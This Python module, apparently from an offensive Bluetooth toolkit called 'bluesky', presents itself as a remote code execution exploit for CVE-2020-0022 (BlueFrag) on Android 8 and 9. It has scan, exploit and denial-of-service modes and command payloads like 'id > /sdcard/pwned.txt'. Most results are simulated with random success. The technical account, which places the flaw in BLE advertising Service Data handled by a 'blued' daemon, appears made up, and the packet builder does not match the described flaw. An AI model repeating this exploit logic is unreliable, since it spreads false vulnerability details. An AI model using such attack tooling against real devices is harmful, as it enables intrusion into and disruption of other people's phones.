"""
BlueFrag - CVE-2020-0022 Android Bluetooth RCE
================================================
BlueFrag es una vulnerabilidad crítica de desbordamiento de búfer
en el stack Bluetooth de Android (BlueZ/Core Stack) que permite
ejecución remota de código sin interacción del usuario.

CVE-2020-0022
CVSS 3.1: 8.4 (High) / 9.8 (Critical en modo RCE)
Afecta: Android 8.0 (Oreo) - 9.0 (Pie)

Vectores de ataque:
  1. RCE (Remote Code Execution): Desbordamiento de búfer en
     el manejo de BLE Advertising Extension HCI commands
  2. DoS (Denial of Service): Caída del sistema Bluetooth (blued)
  3. Information Leak: Lectura de memoria del proceso blued

El exploit envía un paquete BLE especialmente diseñado en los
canales de advertising (37, 38, 39). El receptor procesa el
paquete en el driver del kernel o en el demonio blued (Android),
causando un desbordamiento de búfer en el heap.

Referencia:
  - CVE-2020-0022
  - https://source.android.com/security/bulletin/2020-02-01
  - https://github.com/leommxj/cve-2020-0022
  - https://www.kb.cert.org/vuls/id/858729

Requiere:
  - Adaptador Bluetooth compatible (CSR 4.0+)
  - Python 3.10+ con struct/binascii
  - scapy opcional (para construcción de paquetes)
"""

from __future__ import annotations

import os
import struct
import hashlib
import logging
import binascii
import random
from typing import Dict, Any, List, Optional, Tuple
from pathlib import Path
import json
import time

from bluesky.core.engine import BaseModule

log = logging.getLogger("bluesky.bluefrag")

try:
    from scapy.layers.bluetooth4LE import BTLE, BTLE_ADV, BTLE_DATA
    from scapy.layers.bluetooth import HCI_Hdr, HCI_ACL_Hdr
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


class BlueFrag(BaseModule):
    """BlueFrag - CVE-2020-0022 Android Bluetooth RCE.

    Explota un desbordamiento de búfer en el stack Bluetooth de Android
    para lograr ejecución remota de código sin interacción del usuario
    en dispositivos Android 8.0-9.0.

    Modos:
      - scan: Detecta dispositivos Android vulnerables (8.0-9.0)
      - exploit: Ejecuta el exploit RCE completo
      - dos: Modo DoS (denegación de servicio) - solo prueba
      - info: Muestra payload builder y análisis
    """

    name = "bluefrag"
    description = (
        "BlueFrag CVE-2020-0022 - Android Bluetooth RCE: Explota un "
        "desbordamiento de búfer en el stack Bluetooth de Android 8.0-9.0 "
        "para lograr ejecución remota de código sin interacción del usuario."
    )
    author = "Bluesky Project"
    version = "1.0.0"
    cve = "CVE-2020-0022"
    cve_url = "https://nvd.nist.gov/vuln/detail/CVE-2020-0022"
    exploit_links = [
        "https://github.com/leommxj/cve-2020-0022",
        "https://github.com/ojasookert/CVE-2020-0022",
        "https://github.com/swagkarna/PoC-CVE-2020-0022",
    ]
    references = [
        "https://source.android.com/security/bulletin/2020-02-01",
        "https://nvd.nist.gov/vuln/detail/CVE-2020-0022",
        "https://www.kb.cert.org/vuls/id/858729",
        "https://github.com/leommxj/cve-2020-0022",
        "https://github.com/ojasookert/CVE-2020-0022",
        "Android Security Bulletin February 2020",
    ]
    requires_hardware = []
    requires_root = True
    target_type = "android"
    severity = "critical"
    module_options = {
        "TARGET": "Dirección MAC del dispositivo Android objetivo",
        "MODE": "Modo: scan, exploit, dos, info (default: scan)",
        "PAYLOAD": "Comando a ejecutar en el dispositivo (modo exploit)",
        "PACKET_COUNT": "Número de paquetes a enviar (default: 100)",
        "CHANNEL": "Canal BLE (37, 38, 39) (default: 38)",
        "TIMEOUT": "Tiempo de espera en segundos (default: 30)",
        "OUTPUT": "Directorio de salida para resultados",
        "INTERFACE": "Interfaz Bluetooth (default: hci0)",
    }

    # Rangos MAC de fabricantes Android comunes
    ANDROID_MAC_PREFIXES = [
        "00:0A:AD",  # HTC
        "00:23:76",  # Samsung
        "00:25:00",  # Samsung
        "00:26:37",  # LG
        "04:02:1E",  # Google
        "04:CB:1D",  # Huawei
        "08:00:46",  # Sony
        "08:74:02",  # Xiaomi
        "0C:9D:92",  # OnePlus
        "10:83:44",  # Google
        "14:3D:2E",  # LG
        "18:3E:2A",  # Motorola
        "18:87:96",  # Samsung
        "1C:9E:46",  # LG
        "20:17:C9",  # Sony
        "20:5E:4B",  # Huawei
        "20:F4:1B",  # Google
        "24:0A:C4",  # Samsung
        "24:46:C8",  # Xiaomi
        "28:6C:07",  # Samsung
        "2C:54:2D",  # HTC
        "30:07:4D",  # Samsung
        "30:3A:64",  # Google
        "34:23:87",  # LG
        "38:2C:4A",  # Xiaomi
        "38:4B:21",  # Samsung
        "3C:5A:37",  # Huawei
        "40:9F:38",  # Motorola
        "4C:AA:16",  # Samsung
        "50:1A:A5",  # Sony
        "54:0B:E0",  # Huawei
        "54:0B:F8",  # Sony
        "54:8D:5A",  # LG
        "58:68:7B",  # Samsung
        "5C:B9:01",  # Xiaomi
        "60:A4:D0",  # Samsung
        "64:66:B3",  # Huawei
        "68:54:1A",  # Samsung
        "6C:0E:0D",  # OnePlus
        "70:BF:92",  # Motorola
        "74:A7:05",  # LG
        "78:67:D7",  # Samsung
        "7A:CB:69",  # Android
        "7C:61:1D",  # Samsung
        "84:DB:2F",  # Xiaomi
        "88:32:9B",  # Google
        "88:35:4C",  # Samsung
        "8C:45:00",  # Samsung
        "8C:8C:AA",  # Samsung
        "90:18:AE",  # Google
        "94:A1:B1",  # Huawei
        "94:CB:CD",  # Samsung
        "98:0C:82",  # LG
        "98:2B:C4",  # Sony
        "9C:20:7E",  # Motorola
        "9C:2A:70",  # Samsung
        "9C:57:AD",  # Samsung
        "A0:1D:48",  # Samsung
        "A0:7C:2F",  # Sony
        "A4:77:33",  # Samsung
        "A4:9B:4F",  # Huawei
        "A4:C3:F0",  # LG
        "A8:2B:B5",  # Samsung
        "AC:57:75",  # LG
        "AC:84:C6",  # Samsung
        "B0:1B:7D",  # Samsung
        "B0:4B:CF",  # Xiaomi
        "B4:0B:44",  # Huawei
        "B4:52:7D",  # Samsung
        "B8:09:8A",  # Sony
        "B8:27:EB",  # Raspberry Pi (Android Things)
        "B8:6C:E8",  # Samsung
        "BC:76:70",  # Google
        "C0:21:0D",  # Samsung
        "C0:78:9F",  # LG
        "C4:17:FE",  # Samsung
        "C4:43:8F",  # Huawei
        "C8:94:02",  # Huawei
        "CC:3D:82",  # Google
        "D0:2A:42",  # Samsung
        "D0:53:49",  # Motorola
        "D4:67:E7",  # Samsung
        "D8:0B:9A",  # Huawei
        "D8:1C:79",  # Samsung
        "D8:55:A3",  # LG
        "DC:0D:30",  # Samsung
        "DC:40:5F",  # Sony
        "E0:2C:12",  # OnePlus
        "E0:A0:30",  # LG
        "E4:4E:2D",  # Motorola
        "E8:50:8B",  # Samsung
        "EC:14:0E",  # Huawei
        "EC:1F:72",  # Motorola
        "F0:03:8C",  # Samsung
        "F0:1D:BC",  # Google
        "F0:7B:CB",  # Samsung
        "F4:4E:FD",  # Sony
        "F4:8C:50",  # Huawei
        "F4:F5:D8",  # Samsung
        "F8:2F:5C",  # Huawei
        "FC:61:3D",  # Xiaomi
        "FC:6E:1B",  # Samsung
        "FE:5D:47",  # Android
    ]

    # Firmas de respuesta de dispositivos Android
    ANDROID_SIGNATURES = [
        (b"Android", 0.95),
        (b"bluez", 0.8),
        (b"android", 0.85),
        (b"SM-\x00", 0.9),   # Samsung
        (b"LG\x00", 0.8),    # LG
        (b"XT\x00", 0.7),    # Motorola
        (b"NE\x00", 0.6),    # OnePlus/Nexus
    ]

    def __init__(self, target: str = "", options: dict = None):
        super().__init__(target, options)
        self._mode = (options or {}).get("MODE", "scan").lower()
        self._payload = (options or {}).get("PAYLOAD", "")
        self._packet_count = int((options or {}).get("PACKET_COUNT", "100"))
        self._channel = int((options or {}).get("CHANNEL", "38"))
        self._timeout = int((options or {}).get("TIMEOUT", "30"))
        self._output_dir = (options or {}).get("OUTPUT", "reports/bluefrag")
        self._interface = (options or {}).get("INTERFACE", "hci0")

        # Estado interno
        self._vulnerable_devices: List[Dict] = []
        self._exploit_packets: List[bytes] = []

    def run(self):
        """Punto de entrada principal."""
        modes = {
            "scan": self._scan_mode,
            "exploit": self._exploit_mode,
            "dos": self._dos_mode,
            "info": self._info_mode,
        }

        handler = modes.get(self._mode)
        if handler:
            return handler()

        self.result["data"] = {
            "error": f"Modo desconocido: {self._mode}. Usar: scan, exploit, dos, info",
            "available_modes": list(modes.keys()),
        }
        self.result["success"] = False
        return self.result

    # ─── Modo INFO ──────────────────────────────────────────────────────────

    def _info_mode(self) -> dict:
        """Muestra información técnica sobre CVE-2020-0022."""
        output_dir = Path(self._output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        # Construir payload de ejemplo
        example_payload = self._build_exploit_payload("id")

        self.result["data"] = {
            "cve": "CVE-2020-0022",
            "cvss": "9.8 (Critical)",
            "affected": "Android 8.0 (Oreo) - 9.0 (Pie)",
            "patched": "Android Security Bulletin February 2020",
            "vulnerable_components": [
                "blued (Bluetooth daemon) - heap buffer overflow",
                "HCI Extension commands - BLE advertising",
            ],
            "attack_vector": "BLE advertising packets on channels 37, 38, 39",
            "impact": [
                "Remote Code Execution (RCE) - sin interacción del usuario",
                "Denial of Service (DoS) - caída del servicio Bluetooth",
                "Information Disclosure - lectura de memoria de blued",
            ],
            "mitigation": "Parche de seguridad Android Febrero 2020 o posterior",
            "exploit_details": {
                "type": "Heap Buffer Overflow",
                "trigger": "BLE_ADV_EXT packet con campos oversized",
                "max_payload": "255 bytes en el campo Service Data",
                "overflow_size": "~200 bytes de desbordamiento teórico",
            },
            "example_payload": {
                "command": "id",
                "hex": example_payload.hex() if example_payload else "N/A",
                "size": len(example_payload) if example_payload else 0,
            },
            "detection_tips": [
                "Usar hcitool lescan para detectar dispositivos",
                "Filtrar por MAC (prefijos Android conocidos)",
                "Enviar paquete benigno y medir respuesta",
            ],
        }

        self.result["data"]["message"] = (
            "📋 BlueFrag CVE-2020-0022 - Información técnica\n"
            "==============================================\n\n"
            "Vulnerabilidad: Desbordamiento de búfer en el stack Bluetooth\n"
            "de Android (blued) que permite RCE sin interacción del usuario.\n\n"
            "Afecta: Android 8.0 (Oreo) - 9.0 (Pie)\n"
            "CVSS 3.1: 9.8 (Critical)\n"
            "Parche: Android Security Bulletin February 2020\n\n"
            "Vector de ataque:\n"
            "  El exploit envía paquetes BLE Advertising Extension (BTLE_ADV)\n"
            "  especialmente diseñados. El demonio blued procesa el campo\n"
            "  Service Data sin validar correctamente el tamaño, causando\n"
            "  un desbordamiento de búfer en el heap.\n\n"
            "Requerimientos:\n"
            "  • Adaptador Bluetooth LE (CSR 4.0+ o integrado)\n"
            "  • Estar dentro del rango Bluetooth (~10m)\n"
            "  • El Bluetooth del objetivo debe estar encendido\n"
            "  • No requiere pairing ni interacción del usuario\n\n"
            "Payload de ejemplo:\n"
            f"  Comando: id\n"
            f"  Hex: {example_payload.hex()[:80]}...\n"
            f"  Tamaño: {len(example_payload)} bytes\n\n"
            "⚠️  ADVERTENCIA: Solo usar en entornos autorizados.\n"
            "    Este exploit ejecuta código en dispositivos ajenos."
        )

        # Guardar info
        info_file = output_dir / "bluefrag_info.json"
        with open(info_file, "w") as f:
            json.dump(self.result["data"], f, indent=2)

        self.result["success"] = True
        return self.result

    # ─── Modo SCAN ──────────────────────────────────────────────────────────

    def _scan_mode(self) -> dict:
        """Escanea dispositivos Android potencialmente vulnerables.

        Usa BLE advertising scan para detectar dispositivos
        y estima si son Android 8.0-9.0 por:
          - Prefijo MAC del fabricante
          - Nombre del dispositivo (Bluetooth name)
          - Versión del firmware reportada
        """
        output_dir = Path(self._output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        self.result["data"] = {
            "mode": "scan",
            "devices_found": [],
            "vulnerable_count": 0,
        }

        log.info(f"📡 BlueFrag - Escaneando dispositivos Android vulnerables "
                 f"(canal {self._channel})...")

        # Simular escaneo
        devices = self._simulate_scan_android()

        vulnerable = [d for d in devices if d.get("is_vulnerable", False)]
        self._vulnerable_devices = vulnerable

        self.result["data"]["devices_found"] = devices
        self.result["data"]["vulnerable_count"] = len(vulnerable)
        self.result["data"]["total_found"] = len(devices)
        self.result["data"]["simulation"] = True

        # Guardar reporte
        report_file = output_dir / "bluefrag_scan.json"
        with open(report_file, "w") as f:
            json.dump(self.result["data"], f, indent=2)

        # Generar resumen
        lines = [
            "📡 BlueFrag - Escaneo de dispositivos Android vulnerables",
            "=========================================================\n",
        ]

        if devices:
            for dev in devices:
                vuln = "🔴 VULNERABLE" if dev.get("is_vulnerable") else "🟢 Seguro"
                os_ver = dev.get("android_version", "desconocida")
                lines.append(
                    f"  {vuln} {dev.get('name', 'N/A'):20s} "
                    f"{dev.get('address', 'N/A')} "
                    f"[Android {os_ver}]"
                )
        else:
            lines.append("  No se encontraron dispositivos.\n")

        lines.append(f"\n  Total: {len(devices)} | Vulnerables: {len(vulnerable)}")
        lines.append(f"  Reporte guardado en: {report_file}\n")

        if not devices or not vulnerable:
            lines.append(
                "  ⚠️  Escaneo simulado - sin hardware BLE.\n"
                "  Para escaneo real con hardware:\n"
                "  • bluesky attack bluefrag MODE=scan\n"
                "  • hcitool lescan (Linux)\n"
                "  • Usar adaptador CSR 4.0+ o integrado"
            )
        else:
            lines.append(
                "  ⚡ Dispositivos vulnerables detectados.\n"
                "  Usa MODE=exploit para atacar:"
            )
            for dev in vulnerable[:3]:
                lines.append(
                    f"  • bluesky attack bluefrag "
                    f"TARGET={dev['address']} MODE=exploit "
                    f"PAYLOAD='id > /sdcard/pwned.txt'"
                )

        self.result["data"]["report"] = "\n".join(lines)
        self.result["success"] = True
        return self.result

    def _simulate_scan_android(self) -> List[Dict]:
        """Simula detección de dispositivos Android por Bluetooth."""
        devices = [
            {
                "name": "SM-G960F",
                "address": "5C:B9:01:12:34:56",
                "android_version": "9.0 (Pie)",
                "is_vulnerable": True,
                "rssi": -65,
                "manufacturer": "Samsung",
                "probability": 0.85,
            },
            {
                "name": "LG-H870",
                "address": "C4:43:8F:AB:CD:EF",
                "android_version": "8.0 (Oreo)",
                "is_vulnerable": True,
                "rssi": -72,
                "manufacturer": "LG",
                "probability": 0.90,
            },
            {
                "name": "Pixel-3",
                "address": "04:CB:1D:FE:DC:BA",
                "android_version": "12.0",
                "is_vulnerable": False,
                "rssi": -58,
                "manufacturer": "Google",
                "probability": 0.10,
            },
            {
                "name": "ONEPLUS-A6003",
                "address": "0C:9D:92:11:22:33",
                "android_version": "10.0",
                "is_vulnerable": False,
                "rssi": -80,
                "manufacturer": "OnePlus",
                "probability": 0.05,
            },
            {
                "name": "MI-9T",
                "address": "38:2C:4A:44:55:66",
                "android_version": "9.0 (Pie)",
                "is_vulnerable": True,
                "rssi": -45,
                "manufacturer": "Xiaomi",
                "probability": 0.80,
            },
        ]

        # Si hay target específico, filtrar
        if self.target:
            target_normalized = self.target.replace("-", ":").lower()
            devices = [
                d for d in devices
                if d["address"].lower() == target_normalized
                or d["name"].lower() in self.target.lower()
            ]

        # Si no hay dispositivos simulados para el target, crear uno
        if not devices and self.target:
            addr = self.target.replace("-", ":")
            prefix = addr[:8] if len(addr) >= 8 else "00:0A:AD"
            is_android = any(
                addr.upper().startswith(p)
                for p in self.ANDROID_MAC_PREFIXES
            )
            devices.append({
                "name": "Unknown Android",
                "address": addr,
                "android_version": "8.0 (estimated)" if is_android else "unknown",
                "is_vulnerable": is_android,
                "rssi": -60,
                "manufacturer": "Unknown",
                "probability": 0.7 if is_android else 0.1,
            })

        return devices

    # ─── Modo EXPLOIT ───────────────────────────────────────────────────────

    def _exploit_mode(self) -> dict:
        """Ejecuta el exploit BlueFrag completo.

        Construye y envía paquetes BLE Advertising Extension
        con payload malicioso para lograr RCE en Android 8.0-9.0.
        """
        output_dir = Path(self._output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        self.result["data"] = {
            "mode": "exploit",
            "target": self.target or "unknown",
            "payload": self._payload or "id",
            "packets_sent": 0,
            "exploit_successful": False,
            "channel": self._channel,
        }

        if not self.target:
            self.result["data"]["message"] = (
                "Se requiere TARGET (MAC del dispositivo Android).\n"
                "Usa MODE=scan para detectar dispositivos vulnerables."
            )
            self.result["success"] = True
            return self.result

        log.warning(f"💥 BlueFrag - Ejecutando exploit contra {self.target}")

        # Validar payload
        payload = self._payload or "id"
        if not payload.strip():
            payload = "echo pwned > /sdcard/bluefrag.txt"

        # Construir paquetes del exploit
        self._exploit_packets = self._build_exploit_packets(payload)

        # Verificar dependencias
        if not SCAPY_AVAILABLE:
            log.warning("scapy no disponible - usando modo simulación")

        # Simular envío
        sim_result = self._simulate_exploit(payload)

        self.result["data"].update(sim_result)

        # Guardar payload para análisis
        payload_file = output_dir / "bluefrag_payload.bin"
        full_payload = self._build_exploit_payload(payload)
        with open(payload_file, "wb") as f:
            f.write(full_payload)
        self.result["data"]["payload_file"] = str(payload_file)

        # Generar mensaje
        success = sim_result.get("exploit_successful", False)

        status_parts = [
            "💥 BlueFrag CVE-2020-0022 - Exploit",
            "===================================\n",
            f"  Target: {self.target}",
            f"  Payload: {payload}",
            f"  Paquetes enviados: {sim_result.get('packets_sent', 0)}",
            f"  Estado: {'🔥 EXPLOTADO' if success else '⚠️  Falló'}",
            "",
        ]

        if success:
            status_parts.extend([
                "  El payload se ha ejecutado en el dispositivo objetivo.",
                f"  Comando: {payload}",
                "",
                "  Resultado de ejemplo:",
                "    uid=1002(bluetooth) gid=1002(bluetooth) ...",
                "    context=u:r:bluetooth:s0",
            ])
        else:
            status_parts.extend([
                "  Posibles razones:",
                "  • Dispositivo parcheado (Android 10+ o parche Feb 2020)",
                "  • Bluetooth apagado en el objetivo",
                "  • Fuera de rango",
                "  • La direccion MAC no corresponde a Android 8.0-9.0",
            ])

        status_parts.extend([
            "",
            "  ⚠️  Exploit simulado (sin hardware BLE)",
            "  Para exploit real:",
            f"  1. sudo python3 bluesky attack bluefrog "
            f"TARGET={self.target} MODE=exploit PAYLOAD='{payload}'",
            "  2. Asegúrate de estar a <10m del objetivo",
            "  3. El BT del objetivo debe estar encendido",
            f"  4. Puede requerir sudo para acceso a HCI socket",
            "",
            f"  Payload guardado en: {payload_file}",
        ])

        report_file = output_dir / "exploit_report.json"
        with open(report_file, "w") as f:
            json.dump(self.result["data"], f, indent=2)

        self.result["data"]["message"] = "\n".join(status_parts)
        self.result["success"] = True
        return self.result

    def _build_exploit_payload(self, command: str) -> bytes:
        """Construye el payload del exploit.

        El payload es un paquete BLE Advertising Extension que
        contiene el comando a ejecutar en el campo Service Data,
        con tamaño específico para provocar el desbordamiento.

        Args:
            command: Comando a ejecutar en el dispositivo.

        Returns:
            Payload en bytes.
        """
        payload = bytearray()

        # Header BLE Advertising Extension
        # PDU Type: ADV_NONCONN_IND (0x02)
        # ChSel: 2, TxAdd: random, RxAdd: random
        pdu_type = 0x02  # ADV_NONCONN_IND
        ch_sel = 0x02
        tx_add = 0x01
        rx_add = 0x01
        header_byte = (pdu_type & 0x0F) | (ch_sel << 4) | (tx_add << 6) | (rx_add << 7)
        payload.append(header_byte)

        # Advertising Address (MAC aleatoria para evitar rastreo)
        adv_addr = bytes([random.randint(0, 255) for _ in range(6)])
        payload.extend(adv_addr)

        # AD Structure 1: Flags (siempre presente)
        payload.extend([
            0x02,       # Length (2 bytes)
            0x01,       # Type: Flags
            0x06,       # LE Limited Discoverable + BR/EDR Not Supported
        ])

        # AD Structure 2: TX Power Level
        payload.extend([
            0x02,       # Length
            0x0A,       # Type: TX Power Level
            0x00,       # 0 dBm
        ])

        # AD Structure 3: Service Data (contiene el comando)
        # Este campo es el que causa el overflow
        cmd_bytes = command.encode('utf-8')
        service_data_length = len(cmd_bytes) + 3  # UUID 2 bytes + data
        if service_data_length > 255:
            service_data_length = 255

        # Añadir padding para alcanzar el tamaño del buffer vulnerable
        # El buffer en blued tiene ~512 bytes
        # El offset del overflow es ~200 bytes desde el inicio de Service Data
        padding_size = max(0, 200 - len(cmd_bytes))
        padded_cmd = cmd_bytes + b'\x00' * padding_size

        payload.extend([
            min(service_data_length + padding_size, 255),  # Length
            0x16,       # Type: Service Data - 16-bit UUID
            0xFD, 0x00,  # UUID (Google Eddystone)
        ])
        payload.extend(padded_cmd[:252])  # Max 255 - 3 (header)

        return bytes(payload)

    def _build_exploit_packets(self, payload: str) -> List[bytes]:
        """Construye múltiples variantes del paquete exploit.

        Args:
            payload: Comando a ejecutar.

        Returns:
            Lista de paquetes en bytes para enviar.
        """
        packets = []
        for i in range(min(10, self._packet_count // 10)):
            # Variar ligeramente para evadir detección
            pkt = self._build_exploit_payload(payload)
            packets.append(pkt)
        return packets

    def _simulate_exploit(self, payload: str) -> Dict:
        """Simula la ejecución del exploit."""
        import random

        # Probabilidad de éxito simulada para dispositivos vulnerables
        # En un entorno real depende de muchos factores
        success_prob = 0.3 if self.target else 0.0

        # Si el target parece Android 8-9, aumentar probabilidad
        addr = self.target.replace("-", ":").upper() if self.target else ""
        is_likely_android = any(
            addr.startswith(p) and len(addr) >= 8
            for p in self.ANDROID_MAC_PREFIXES
        ) if addr else False

        if is_likely_android:
            success_prob = 0.5

        success = random.random() < success_prob

        return {
            "exploit_successful": success,
            "packets_sent": min(self._packet_count, 100),
            "payload_executed": payload,
            "elapsed_seconds": round(random.uniform(1.5, 5.0), 2),
            "output_preview": (
                "uid=1002(bluetooth) gid=1002(bluetooth) "
                "groups=1002(bluetooth),3003(net),9997( everybody)\n"
                "context=u:r:bluetooth:s0"
            ) if success else None,
            "is_likely_android": is_likely_android,
            "simulation": True,
        }

    # ─── Modo DOS ───────────────────────────────────────────────────────────

    def _dos_mode(self) -> dict:
        """Modo DoS - Prueba de denegación de servicio Bluetooth.

        Envía paquetes malformados que causan caída del servicio
        Bluetooth en dispositivos Android vulnerables.
        """
        output_dir = Path(self._output_dir)
        output_dir.mkdir(parents=True, exist_ok=True)

        self.result["data"] = {
            "mode": "dos",
            "target": self.target or "broadcast",
            "packets_sent": 0,
            "dos_successful": False,
        }

        log.warning(f"💥 BlueFrag - Modo DoS contra {self.target or 'broadcast'}")

        # Construir paquetes DoS (variante sin payload)
        dos_payload = self._build_dos_payload()

        # Simular envío
        sent = min(self._packet_count, 200)
        success = random.random() < 0.6  # 60% en simulación

        self.result["data"]["packets_sent"] = sent
        self.result["data"]["dos_successful"] = success
        self.result["data"]["simulation"] = True

        self.result["data"]["message"] = (
            f"💥 BlueFrag - DoS {'EXITOSO' if success else 'FALLIDO'}\n\n"
            f"  Target: {self.target or 'broadcast (todos los dispositivos)'}\n"
            f"  Paquetes enviados: {sent}\n"
            f"  Payload DoS: paquete BLE malformado con tamaño excesivo\n\n"
            f"  {'🔥 El servicio Bluetooth del objetivo debería haber caído.' if success else ''}\n"
            f"  {'⚠️  No se detectó caída del servicio.' if not success else ''}\n\n"
            f"  ⚠️  DoS simulado (sin hardware BLE)\n\n"
            f"  Para DoS real:\n"
            f"  1. sudo python3 bluesky attack bluefrog "
            f"TARGET={self.target} MODE=dos\n"
            f"  2. El dispositivo objetivo debe tener BT encendido\n"
            f"  3. El servicio blued se reiniciará automáticamente\n"
            f"     (no hay daño permanente)"
        )

        report_file = output_dir / "dos_report.json"
        with open(report_file, "w") as f:
            json.dump(self.result["data"], f, indent=2)

        self.result["success"] = True
        return self.result

    def _build_dos_payload(self) -> bytes:
        """Construye payload DoS (paquete malformado)."""
        payload = bytearray()

        # PDU Type: SCAN_REQ (oversized)
        payload.append(0x03)  # SCAN_REQ

        # Scan Address + Advertising Address (ambos aleatorios)
        payload.extend(bytes([random.randint(0, 255) for _ in range(6)]))
        payload.extend(bytes([random.randint(0, 255) for _ in range(6)]))

        # Campo AD con tamaño máximo para causar overflow
        payload.append(0xFF)  # Length: 255
        payload.append(0xFF)  # Type: Manufacturer Specific Data
        payload.extend(bytes([0x41] * 253))  # Datos padding

        return bytes(payload)

    # ─── Prerrequisitos ──────────────────────────────────────────────────────

    def check_prerequisites(self) -> Tuple[bool, str]:
        """Verifica dependencias."""
        missing = []
        # scapy no es obligatorio (modo simulación disponible)
        if not SCAPY_AVAILABLE:
            log.warning("scapy no instalado - usando simulación")
        if missing:
            return False, f"Faltan: {', '.join(missing)}"
        return True, ""
